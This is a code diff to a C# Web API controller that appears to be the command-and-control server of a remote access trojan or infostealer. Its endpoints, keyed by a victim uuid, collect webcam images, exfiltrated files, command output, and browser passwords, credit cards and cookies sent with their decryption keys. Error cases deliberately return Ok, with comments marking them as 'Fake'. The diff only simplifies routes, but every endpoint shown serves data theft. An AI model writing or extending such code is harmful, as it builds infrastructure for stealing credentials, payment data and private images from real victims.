@@ -56,8 +56,8 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
             await responseService.StoreWebcam(uuid,1, imageData, instructionId);
             return Ok();
         }
-        [HttpPost("File/{uuid}/{instructionId}")]
-        public async Task<IActionResult> ReceiveFile(string uuid,long instructionId)
+        [HttpPost("File/{uuid}")]
+        public async Task<IActionResult> ReceiveFile(string uuid)
         {
             if (!Request.Form.Files.Any())
                 return Ok(); // Fake (BadRequest)
@@ -65,7 +65,7 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
             var file = Request.Form.Files.FirstOrDefault();
             if (file == null || file.Length == 0)
                 return Ok();// Fake (BadRequest)
-            await responseService.StoreFile(uuid, instructionId, file);
+            await responseService.StoreFile(uuid, file);
             return Ok();
         }
         [HttpPost("{uuid}/{instructionId}/{Code}")]
@@ -74,8 +74,8 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
             await responseService.ResponseOutput(uuid, instructionId, Code, ResponseNotify.output, ResponseNotify.args);
             return Ok();
         }
-        [HttpPost("Browser/Password/{uuid}/{instructionId}")]
-        public async Task<IActionResult> BrowserPassword(string uuid,long instructionId,[FromBody] BrowserPasswordVM pass)
+        [HttpPost("Browser/Password/{uuid}")]
+        public async Task<IActionResult> BrowserPassword(string uuid,[FromBody] BrowserPasswordVM pass)
         {
             if (!ModelState.IsValid)
             {
@@ -83,11 +83,11 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
             }
             byte[] Data = Convert.FromBase64String(pass.Data);
             byte[] Key = Convert.FromBase64String(pass.Key);
-            await responseService.BrowserPasswordExtracting(uuid, instructionId, Data, Key, pass.Browser);
+            await responseService.BrowserPasswordExtracting(uuid, Data, Key, pass.Browser);
             return Ok();
         }
-        [HttpPost("Browser/CreditCard/{uuid}/{instructionId}")]
-        public async Task<IActionResult> BrowserCards(string uuid, long instructionId, [FromBody] BrowserPasswordVM pass)
+        [HttpPost("Browser/CreditCard/{uuid}")]
+        public async Task<IActionResult> BrowserCards(string uuid, [FromBody] BrowserPasswordVM pass)
         {
             if (!ModelState.IsValid)
             {
@@ -95,11 +95,11 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
             }
             byte[] Data = Convert.FromBase64String(pass.Data);
             byte[] Key = Convert.FromBase64String(pass.Key);
-            await responseService.BrowserCreditCardExtracting(uuid, instructionId, Data, Key, pass.Browser);
+            await responseService.BrowserCreditCardExtracting(uuid, Data, Key, pass.Browser);
             return Ok();
         }
-        [HttpPost("Browser/Cookies/{uuid}/{instructionId}")]
-        public async Task<IActionResult> BrowserCookies(string uuid, long instructionId, [FromBody] BrowserPasswordVM pass)
+        [HttpPost("Browser/Cookies/{uuid}")]
+        public async Task<IActionResult> BrowserCookies(string uuid, [FromBody] BrowserPasswordVM pass)
         {
             if (!ModelState.IsValid)
             {
@@ -107,7 +107,7 @@ namespace X_ZIGZAG_SERVER_WEB_API.Controllers
             }
             byte[] Data = Convert.FromBase64String(pass.Data);
             byte[] Key = Convert.FromBase64String(pass.Key);
-            await responseService.BrowserCookiesExtracting(uuid, instructionId, Data, Key, pass.Browser);
+            await responseService.BrowserCookiesExtracting(uuid, Data, Key, pass.Browser);
             return Ok();
         }
     }
